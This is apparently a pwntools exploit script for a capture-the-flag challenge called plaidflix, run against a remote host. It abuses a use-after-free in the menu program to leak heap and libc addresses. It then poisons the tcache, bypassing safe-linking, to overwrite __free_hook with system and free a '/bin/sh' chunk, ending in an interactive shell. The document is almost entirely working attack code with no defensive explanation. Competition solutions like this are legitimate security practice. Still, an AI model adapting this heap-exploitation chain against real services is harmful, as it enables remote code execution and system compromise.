__author__ = "cMc_SARS"

from pwn import *
context(terminal='zsh', arch='amd64', log_level='info')

p = remote('plaidflix.pwni.ng', 1337)

# def recvptr(self): return u64(self.recvn(6).ljust(8, "\x00"))
def recvptr(self): return u64(self.recvline().rstrip().ljust(8, "\x00"))
pwnlib.tubes.remote.remote.recvptr = recvptr
pwnlib.tubes.process.process.recvptr = recvptr

def chose(n):
    p.sendlineafter("> ", str(n))

def add_movie(a1="AAA", a2="5"):
    chose("0")
    chose("0")
    p.sendafter("> ", (str(a1)+"\n")[:])
    p.sendafter("> ", (str(a2)+"\n")[:])

def remove_movie(idx):
    chose("0")
    chose("1")
    chose(idx)

def show_movie():
    chose("0")
    chose("2")

def share_movie(idx1, idx2):
    chose("0")
    chose("3")
    chose(idx1)
    chose(idx2)

def add_friend(a1="8", a2="BBBBBBBB"):
    chose("1")
    chose("0")
    p.sendafter("> ", (str(a1)+"\n")[:])
    p.sendafter("> ", (str(a2)+"\n")[:])

def remove_friend(idx=0):
    chose("1")
    chose("1")
    chose(idx)

def show_friend():
    chose("1")
    chose("2")

# Name on stack
chose("AAAAAAAA")
add_friend(0x10, "A"*0x10)
add_movie()
share_movie(0, 0)
remove_friend(0)
show_movie()
p.recvuntil("* Shared with: ")
heap_addr = (p.recvptr() << 12)
print(hex(heap_addr))
remove_movie(0)

for i in range(8):
    add_friend(0x7f, "A"*0x7f)
add_movie()
add_movie()
share_movie(0, 7)
for i in range(8):
    remove_friend(i)

for i in range(8):
    add_friend(0x8f, "A"*0x8f)
for i in range(8):
    remove_friend(i)
show_movie()
p.recvuntil("* Shared with: ")
libc_addr = (p.recvptr())
print(hex(libc_addr))

chose(2)
chose('y')

def add_feedback(a0="AAAAAAAA"):
    chose("0")
    p.sendafter("> ", (str(a0)+"\n")[:])

def delete_feedback(a0="0"):
    chose("1")
    p.sendafter("> ", (str(a0)+"\n")[:])

def add_contact_detail(a0="AAAAAAAA"):
    chose("2")
    p.sendafter("> ", (str(a0)+"\n")[:])

for i in range(10):
    add_feedback()
for i in range(10):
    delete_feedback(i)
add_contact_detail()
for i in range(8):
    add_feedback()

delete_feedback(0)
delete_feedback(7)  # 0x610
delete_feedback(8)  # 0x5f0
payload = "A" * 24 + p64(0x111) + p64(0xdeadbeef) * 2
add_feedback(payload)  # 0: 0x5f0
delete_feedback(7)  # 0x610
free_hook = libc_addr + 0x31c1
system_addr = libc_addr - 0x1938c0
fd = free_hook ^ (heap_addr >> 12)
add_feedback(p64(fd))
add_feedback("/bin/sh\x00")
add_feedback(p64(system_addr))
delete_feedback(8)

p.interactive()
